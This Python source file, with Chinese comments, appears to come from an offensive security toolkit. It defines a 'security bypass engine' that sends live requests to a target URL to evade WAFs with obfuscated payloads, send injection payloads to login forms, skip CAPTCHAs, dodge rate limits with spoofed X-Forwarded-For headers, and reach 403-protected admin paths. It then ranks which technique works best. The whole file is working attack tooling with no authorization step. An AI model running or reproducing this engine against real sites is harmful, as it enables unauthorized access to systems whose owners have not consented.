"""
security/security_bypass_engine.py - 安全验证绕过引擎

核心能力：
- SecurityBypassEngine: 统一安全验证绕过引擎
  - WAF绕过（编码绕过/参数污染/分块传输/协议层绕过）
  - 认证绕过（SQL注入认证/JWT伪造/会话固定/权限提升）
  - 验证码绕过（重放/空值/绕过检查/机器学习识别）
  - 速率限制绕过（IP轮换/请求分散/慢攻击/缓存投毒）
  - 403/401绕过（路径遍历/Header注入/方法替换）
- PayloadObfuscator: Payload混淆器
  - 多种编码（URL/Unicode/HTML/Base64/Hex）
  - 字符串拆分与拼接
  - 注释注入
  - 大小写混淆
- BypassTester: 绕过测试器
  - 自动测试多种绕过技术
  - 成功率统计
  - 最优绕过方案推荐
"""
import os
import re
import sys
import json
import time
import uuid
import random
import hashlib
import base64
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict, Counter
from enum import Enum
from .models import *  # noqa: F401,F403
from .constants import *  # noqa: F401,F403

class SecurityBypassEngine:
    """统一安全验证绕过引擎

    整合WAF/认证/验证码/速率限制/403绕过技术，
    自动测试并推荐最优绕过方案。
    """

    def __init__(self):
        self.obfuscator = PayloadObfuscator()
        self.techniques: Dict[str, List[BypassTechnique]] = defaultdict(list)
        self.results: List[BypassResult] = []
        self._init_techniques()

    def _init_techniques(self):
        """初始化绕过技术库"""
        technique_libraries = {
            "waf": WAF_BYPASS_TECHNIQUES,
            "auth": AUTH_BYPASS_TECHNIQUES,
            "captcha": CAPTCHA_BYPASS_TECHNIQUES,
            "rate_limit": RATE_LIMIT_BYPASS_TECHNIQUES,
            "forbidden": FORBIDDEN_BYPASS_TECHNIQUES,
        }
        for bypass_type, tech_list in technique_libraries.items():
            for tech in tech_list:
                self.techniques[bypass_type].append(BypassTechnique(
                    bypass_type=bypass_type,
                    name=tech["name"],
                    description=tech["description"],
                    payload_template=tech.get("payload_template", tech.get("payload", "")),
                    success_indicators=tech.get("success_indicators", []),
                    risk_level=tech.get("risk_level", "medium"),
                ))

    def bypass_waf(self, url: str, original_payload: str,
                   param: str = "q", max_tests: int = 10) -> List[BypassResult]:
        """测试WAF绕过

        Args:
            url: 目标URL
            original_payload: 原始Payload
            param: 参数名
            max_tests: 最大测试数
        """
        results = []

        # 1. 生成混淆变体
        variants = self.obfuscator.generate_all_variants(original_payload)

        # 2. 测试每种变体
        for variant in variants[:max_tests]:
            result = self._test_payload(
                url, param, variant["payload"],
                bypass_type="waf",
                technique_name=variant["technique"],
            )
            results.append(result)

            if result.success:
                break  # 找到成功的就停止

        # 3. 测试WAF专用绕过技术
        for tech in self.techniques["waf"][:5]:
            if tech.payload_template and "{payload}" in tech.payload_template:
                test_payload = tech.payload_template.format(payload=original_payload)
            else:
                test_payload = original_payload

            result = self._test_payload(
                url, param, test_payload,
                bypass_type="waf",
                technique_name=tech.name,
            )
            results.append(result)

            if result.success:
                break

        self.results.extend(results)
        return results

    def bypass_auth(self, login_url: str, username: str = "admin",
                    password: str = "password") -> List[BypassResult]:
        """测试认证绕过"""
        results = []

        for tech in self.techniques["auth"]:
            result = BypassResult(
                target_url=login_url,
                bypass_type="auth",
                technique_name=tech.name,
                payload_used=tech.payload_template,
            )

            # 模拟测试（实际应发送请求）
            try:
                import requests
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                data = {"username": tech.payload_template or username, "password": password}
                start = time.time()
                resp = requests.post(login_url, data=data, headers=headers, timeout=10, verify=False)
                result.status_code = resp.status_code
                result.response_time = time.time() - start
                result.response_preview = resp.text[:500]

                for indicator in tech.success_indicators:
                    if indicator.lower() in resp.text.lower():
                        result.success = True
                        result.evidence.append(f"匹配成功指标: {indicator}")
                        break
            except Exception as e:
                result.notes = f"测试失败: {str(e)}"

            results.append(result)
            if result.success:
                break

        self.results.extend(results)
        return results

    def bypass_captcha(self, url: str, form_data: Dict = None) -> List[BypassResult]:
        """测试验证码绕过"""
        results = []
        form_data = form_data or {}

        for tech in self.techniques["captcha"]:
            result = BypassResult(
                target_url=url,
                bypass_type="captcha",
                technique_name=tech.name,
                payload_used=tech.payload_template,
            )

            # 模拟测试
            test_data = dict(form_data)
            if tech.payload_template == "remove_captcha_param":
                test_data.pop("captcha", None)
            elif tech.payload_template == "captcha=":
                test_data["captcha"] = ""
            else:
                test_data["captcha"] = tech.payload_template

            result.notes = f"测试数据: {json.dumps(test_data)[:200]}"
            results.append(result)

        self.results.extend(results)
        return results

    def bypass_rate_limit(self, url: str, test_count: int = 20) -> List[BypassResult]:
        """测试速率限制绕过"""
        results = []

        for tech in self.techniques["rate_limit"]:
            result = BypassResult(
                target_url=url,
                bypass_type="rate_limit",
                technique_name=tech.name,
            )

            # 模拟：使用不同的Header发送多个请求
            blocked_count = 0
            success_count = 0

            for i in range(min(test_count, 10)):
                try:
                    import requests
                    headers = {}
                    if tech.name == "X-Forwarded-For绕过":
                        headers["X-Forwarded-For"] = f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"
                    elif tech.name == "X-Real-IP绕过":
                        headers["X-Real-IP"] = f"10.0.{random.randint(0,255)}.{random.randint(0,255)}"

                    resp = requests.get(url, headers=headers, timeout=5, verify=False)
                    if resp.status_code == 429:
                        blocked_count += 1
                    else:
                        success_count += 1
                except Exception:
                    blocked_count += 1

            result.evidence.append(f"成功: {success_count}, 被拦截: {blocked_count}")
            result.success = success_count > blocked_count
            results.append(result)

        self.results.extend(results)
        return results

    def bypass_forbidden(self, url: str, target_path: str = "/admin") -> List[BypassResult]:
        """测试403/401绕过"""
        results = []

        for tech in self.techniques["forbidden"]:
            result = BypassResult(
                target_url=url,
                bypass_type="forbidden",
                technique_name=tech.name,
                payload_used=tech.payload_template,
            )

            # 构建测试URL
            test_url = url.rstrip("/") + target_path
            if tech.payload_template and tech.payload_template.startswith("/"):
                test_url = url.rstrip("/") + tech.payload_template

            # 模拟测试
            try:
                import requests
                start = time.time()

                if tech.name == "Header注入绕过403":
                    headers = {"X-Original-URL": target_path, "X-Rewrite-URL": target_path}
                    resp = requests.get(url, headers=headers, timeout=10, verify=False)
                elif tech.name == "方法替换绕过403":
                    resp = requests.post(test_url, timeout=10, verify=False)
                else:
                    resp = requests.get(test_url, timeout=10, verify=False)

                result.status_code = resp.status_code
                result.response_time = time.time() - start
                result.response_preview = resp.text[:300]

                if resp.status_code == 200:
                    result.success = True
                    result.evidence.append(f"状态码200，绕过成功")
                elif resp.status_code != 403 and resp.status_code != 401:
                    result.evidence.append(f"状态码{resp.status_code}，可能部分绕过")

            except Exception as e:
                result.notes = f"测试失败: {str(e)}"

            results.append(result)
            if result.success:
                break

        self.results.extend(results)
        return results

    def _test_payload(self, url: str, param: str, payload: str,
                      bypass_type: str, technique_name: str) -> BypassResult:
        """测试单个Payload"""
        result = BypassResult(
            target_url=url,
            bypass_type=bypass_type,
            technique_name=technique_name,
            payload_used=payload,
        )

        try:
            import requests
            test_url = f"{url}?{param}={urllib.parse.quote(payload, safe='')}"
            start = time.time()
            resp = requests.get(test_url, timeout=10, verify=False)
            result.status_code = resp.status_code
            result.response_time = time.time() - start
            result.response_preview = resp.text[:300]

            # 判断是否绕过成功（非403/406且有响应）
            if resp.status_code == 200 and len(resp.text) > 100:
                # 检查是否有SQL错误等漏洞迹象
                if any(kw in resp.text.lower() for kw in ["sql", "error", "syntax", "mysql", "oracle"]):
                    result.success = True
                    result.evidence.append("发现SQL错误，WAF绕过且漏洞存在")
                else:
                    result.evidence.append("WAF绕过（200响应），但未发现漏洞迹象")
            elif resp.status_code == 403 or resp.status_code == 406:
                result.evidence.append(f"被WAF拦截（{resp.status_code}）")

        except Exception as e:
            result.notes = f"请求失败: {str(e)}"

        return result

    def get_best_technique(self, bypass_type: str) -> Optional[BypassTechnique]:
        """获取成功率最高的绕过技术"""
        techniques = self.techniques.get(bypass_type, [])
        if not techniques:
            return None
        return max(techniques, key=lambda t: t.success_rate)

    def get_statistics(self) -> Dict:
        """获取绕过统计"""
        by_type = defaultdict(lambda: {"total": 0, "success": 0})
        for result in self.results:
            by_type[result.bypass_type]["total"] += 1
            if result.success:
                by_type[result.bypass_type]["success"] += 1

        return {
            "total_tests": len(self.results),
            "total_success": sum(1 for r in self.results if r.success),
            "by_type": {k: {**v, "rate": round(v["success"]/v["total"]*100, 1) if v["total"] > 0 else 0}
                        for k, v in by_type.items()},
            "techniques_count": {k: len(v) for k, v in self.techniques.items()},
        }

    def generate_bypass_report(self) -> str:
        """生成绕过测试报告"""
        stats = self.get_statistics()
        lines = ["# 安全验证绕过测试报告", ""]
        lines.append(f"**总测试数**: {stats['total_tests']}")
        lines.append(f"**总成功数**: {stats['total_success']}")
        lines.append(f"**成功率**: {round(stats['total_success']/stats['total_tests']*100, 1) if stats['total_tests'] > 0 else 0}%")
        lines.append("")
        lines.append("## 按类型统计")
        lines.append("")
        lines.append("| 类型 | 测试数 | 成功数 | 成功率 |")
        lines.append("|------|--------|--------|--------|")
        for btype, data in stats["by_type"].items():
            lines.append(f"| {btype} | {data['total']} | {data['success']} | {data['rate']}% |")
        lines.append("")
        lines.append("## 绕过技术库")
        lines.append("")
        for btype, techniques in self.techniques.items():
            lines.append(f"### {btype} ({len(techniques)}种技术)")
            lines.append("")
            for tech in techniques:
                lines.append(f"- **{tech.name}**: {tech.description}")
            lines.append("")
        return "\n".join(lines)
